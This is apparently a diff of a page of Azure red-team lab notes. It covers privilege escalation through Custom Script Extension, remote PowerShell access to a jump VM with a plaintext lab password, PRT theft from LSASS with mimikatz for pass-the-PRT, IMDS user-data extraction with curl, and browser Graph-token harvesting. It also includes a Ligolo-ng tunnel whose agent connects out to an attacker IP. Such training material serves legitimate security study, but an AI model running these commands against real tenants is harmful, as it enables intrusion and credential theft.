+<h1>Privilege Escalation - User Data and Custom Script Extension Abuse</h1>
+
+<p>Azure VM Custom Script Extension allows administrators to run scripts on VMs after provisioning.</p>
+
+<p>If we have sufficient permissions, we can execute commands on VMs:</p>
+
+<pre><code>Set-AzVMCustomScriptExtension -ResourceGroupName "Name" -VMName "VMName" -Name "ExtName" -StorageAccountName "Storage" -ContainerName "Scripts" -FileName "evil.ps1"</code></pre>
+
+<h1>Accessing JumVM</h1>
+
+<p>We successfully added a local user to the jumpvm during the Evilginx3 campaign.</p>
+
+<pre><code>$password = ConvertTo-SecureString 'Stud59Password@123' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('student59', $password)
+$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+Enter-PSSession -Session $jumpvm</code></pre>
+
+<h1>Extracting PRT and executing Pass-The-Certificate</h1>
+
+<h2>Primary Refresh Token Extraction</h2>
 
 <p>The Primary Refresh Token acts as the persistent digital identity card for a user on a specific device. We target this artifact because retrieving it allows us to impersonate the user from a different location.</p>
 
-<p>Use tools like <code>mimikatz</code> to perform memory scraping on the Local Security Authority Subsystem Service (LSASS).</p>
+<p>Use tools like mimikatz to perform memory scraping on the Local Security Authority Subsystem Service (LSASS).</p>
 
-<h3>Pass-the-PRT Attack Mechanics</h3>
+<h2>Pass-the-PRT Attack Mechanics</h2>
 
 <p>Inject the decrypted token directly into our browser session or attack tool. This tricks Azure into recognizing our traffic as coming from the victim's verified laptop.</p>
 
 <p>This grants instant authenticated access to the user's applications without knowing their password or needing access to their MFA device.</p>
 
-<h3>PRT Renewal and Conditional Access Bypass</h3>
+<h2>PRT Renewal and Conditional Access Bypass</h2>
 
 <p>The longevity of our access relies on understanding how the Primary Refresh Token can be renewed. As long as the victim device remains active, we can potentially extend our access.</p>
 
+<h1>Extracting clear-text credentials from user data and Graph API tokens</h1>
+
+<p>We execute this as a two-pronged data mining operation.</p>
+
+<h2>Method 1: User Data from IMDS</h2>
+
+<p>Query Azure Instance Metadata Service for the <strong>User Data</strong> attribute:</p>
+
+<pre><code>curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=text"</code></pre>
+
+<p>Because this data is Base64 encoded rather than encrypted, we can decode the response immediately to reveal cleartext data.</p>
+
+<h2>Method 2: Graph API Tokens from Browser</h2>
+
+<p>Pivot to targeting web browsers installed on the machine to harvest <strong>Graph API Tokens</strong>.</p>
+
+<p>Since we possess local administrative privileges, we have the authority to read the personal files of other users who have logged in.</p>
+
 <h1>Configuring Ligolo-NG (Tunneling)</h1>
 
-<p><strong>Ligolo-ng</strong> is a simple, lightweight and fast tool that allows pentesters to establish tunnels using a <strong>tun interface</strong>.</p>
+<p><strong>Ligolo-ng</strong> is a simple, lightweight and fast tool that allows pentesters to establish tunnels using a tun interface (without the need of SOCKS).</p>
 
-<p><strong>On Attacking VM:</strong></p>
+<h2>On Attacking VM:</h2>
 
 <pre><code>.\proxy.exe -selfcert -laddr 0.0.0.0:9059</code></pre>
 
-<p><strong>On target jumpvm:</strong></p>
+<h2>On target jumpvm:</h2>
 
-<pre><code>Start-Process -FilePath "C:\agent.exe" -ArgumentList "-connect 51.210.1.239:9059 -ignore-cert" -NoNewWindow
+<pre><code>Start-Process -FilePath "C:\agent.exe" -ArgumentList "-connect 51.210.1.239:9059 -ignore-cert" -NoNewWindow</code></pre>
 
-netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=53 connectaddress=10.0.1.5 connectport=5985</code></pre>
+<pre><code>netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=53 connectaddress=10.0.1.5 connectport=5985</code></pre>
 
-<img src="../../assets/cartp/image%20282.png" alt="Ligolo-ng Session">
+<h2>On Attacking VM:</h2>
 
-<p><strong>On Attacking VM:</strong></p>
-
-<pre><code>session</code></pre>
-
-<p>Choose the session from our jumvm and create the interface:</p>
-
-<pre><code>interface add</code></pre>
+<pre><code>session
+interface add</code></pre>
 
         </section>
       </article>
